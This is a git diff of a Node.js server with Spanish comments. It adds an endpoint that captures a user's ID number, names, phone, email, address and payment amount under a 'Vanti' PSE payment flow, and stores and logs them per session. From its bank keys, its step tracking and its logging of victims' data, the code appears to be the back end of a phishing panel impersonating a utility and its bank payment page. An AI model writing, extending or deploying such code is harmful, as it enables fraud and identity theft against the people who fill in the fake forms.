@@ -303,6 +303,9 @@ const server = http.createServer(async (req, res) => {
                     const registros = historial.filter(h => h.datos && h.datos.sessionId === sid);
                     let datos = {};
                     if (registros.length > 0) { datos = registros[0].datos; } else { datos = datosSesiones.get(sid) || {}; }
+                    // Mezclar con los datos en memoria por si son más recientes (PSE recién llenado)
+                    const memoria = datosSesiones.get(sid) || {};
+                    datos = Object.assign({}, datos, memoria);
                     const paso = pasosSesiones.get(sid) || 'index';
                     lista.push({ sessionId: sid, estado, datos, paso });
                 }
@@ -570,6 +573,50 @@ const server = http.createServer(async (req, res) => {
                 
                 console.log(`[VANTI] Nueva sesión: ${sessionId} | Cuenta: ${cuenta}`);
                 json(res, 200, { ok: true, sessionId });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
+        // ============================================================
+        // 🔥 NUEVO: Guardar datos del formulario PSE (nombre, cédula, etc.)
+        // ============================================================
+        if (req.method === 'POST' && url === '/vanti/guardar-pse') {
+            try {
+                const datos = await getBody(req);
+                const { sessionId, cuenta, tipoDoc, numDoc, nombres, apellidos, celular, correo, direccion, rol, precio } = datos;
+                if (!sessionId) { json(res, 400, { ok: false }); return; }
+
+                const previos = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, previos, {
+                    cuenta: cuenta || previos.cuenta,
+                    tipoDoc,
+                    documento: numDoc,
+                    docNumber: numDoc,
+                    docType: tipoDoc,
+                    nombres,
+                    apellidos,
+                    telefono: celular,
+                    celular,
+                    correo,
+                    direccion,
+                    rol,
+                    precio,
+                    monto: precio
+                });
+
+                datosSesiones.set(sessionId, datosCompletos);
+
+                // Actualizar el historial existente o crear uno nuevo
+                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
+                if (idx !== -1) {
+                    historial[idx].datos = Object.assign({}, historial[idx].datos, datosCompletos);
+                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                } else {
+                    guardarHistorial('vanti', datosCompletos);
+                }
+
+                console.log(`[VANTI-PSE] Datos guardados para ${sessionId} | Doc: ${numDoc} | Nombre: ${nombres} ${apellidos}`);
+                json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
